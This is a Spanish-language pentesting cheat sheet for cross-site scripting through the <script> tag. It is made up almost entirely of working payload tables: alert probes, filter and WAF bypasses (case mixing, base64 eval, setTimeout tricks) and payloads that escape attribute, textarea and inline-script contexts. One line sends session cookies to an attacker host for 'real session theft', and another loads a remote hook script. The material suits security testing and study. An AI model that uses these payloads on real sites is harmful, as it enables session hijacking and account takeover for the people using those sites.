---
aliases:
  - Content Security Policy
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Etiqueta `<script>` Estándar

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>alert(window.origin)</script>` | Alert con dominio víctima — confirma XSS y revela iframe context | Probe canónico. `window.origin` > `1` por IFrame fingerprinting. |
| `<script>print()</script>` | Diálogo print — alternativa cuando `alert` filtrado | Filtro keyword-only. |
| `<script>alert(document.cookie)</script>` | Cookie de sesión en alert | Confirmar session hijack viable. |
| `<script>fetch('//attacker/?c='+document.cookie)</script>` | Cookie exfil silencioso a tu server | Post-PoC, robo real de sesión. |
| `<script src="//attacker/hook.js"></script>` | Carga payload externo arbitrario | Bypassea límites de longitud, integra BeEF/XSS Hunter. |
| `<script defer>alert(1)</script>` | Bypass de WAF que busca `<script>` exacto sin atributos | Filtro léxico básico. |
| `<sCrIpT>alert(1)</ScRiPt>` | Bypass case-sensitive regex | WAF con regex `/<script>/`. |
| `<script/x>alert(1)</script>` | Slash como separador de atributo — rompe regex `<script\s` | Filtros estrictos en whitespace. |
| `<script>eval(atob('YWxlcnQoMSk='))</script>` | Decode + eval base64 — oculta `alert` literal | Filtros bloquean keywords internos. |
| `<script>setTimeout(`${atob('YWxlcnQoMSk=')}`)</script>` | Template literal + setTimeout para evadir `eval` blocked | Alt cuando `eval` está filtrado. |
^xss-script

### Escape de contextos previos

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `"><script>alert(1)</script>` | Sale del atributo + ejecuta | Reflejo en `<input value="INYECCIÓN">`. |
| `'><script>alert(1)</script>` | Misma idea con comillas simples | Reflejo en `value='INYECCIÓN'`. |
| `</textarea><script>alert(1)</script>` | Cierra textarea/title/xmp protector | Reflejo dentro de etiquetas content-as-text. |
| `';}</script><script>alert(1)</script>` | Cierra string JS + bloque script + abre nuevo | Reflejo DENTRO de `<script>var x='INYECCIÓN';</script>`. |
^xss-script-escapes

---

## Overview

Tag `<script>` = vector más directo de XSS. Asume que la app refleja input en DOM permitiendo HTML, y que `script` no está en blacklist.

`alert(window.origin)` > `alert(1)` por iframe cross-domain: si la app vulnerable corre dentro de iframe, `window.origin` revela qué URL ejecutó el código.

Si `<script>` filtrado → pivotar a [[XSS - Manejadores de Eventos HTML]] (event handlers) o [[XSS - Pseudo-protocolos]] (`javascript:`).

---
